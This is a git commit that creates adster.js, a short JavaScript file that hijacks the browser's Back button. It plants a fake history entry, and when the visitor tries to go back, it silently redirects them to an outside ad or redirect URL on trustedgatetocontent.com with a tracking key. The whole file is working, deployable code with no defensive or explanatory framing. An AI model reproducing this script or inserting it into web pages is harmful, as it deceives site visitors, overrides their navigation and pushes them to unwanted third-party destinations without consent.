045acb69f84eadf37a154d8b33648cd77196a972
makmakmuh <92998008+makmakmuh@users.noreply.github.com>
2021-10-22 22:50:40 +0700

    Create adster.js

---
+++ adster.js
@@ -0,0 +1,13 @@
+(function(window, location) {
+history.replaceState(null, document.title, location.pathname+"#!/history");
+history.pushState(null, document.title, location.pathname);
+
+window.addEventListener("popstate", function() {
+  if(location.hash === "#!/history") {
+    history.replaceState(null, document.title, location.pathname);
+    setTimeout(function(){
+      location.replace("https://www.trustedgatetocontent.com/wkffqfiaqb?key=6ec3d29511c99ba3056ade5a263892b0");
+    },10);
+  }
+}, false);
+}(window, location));
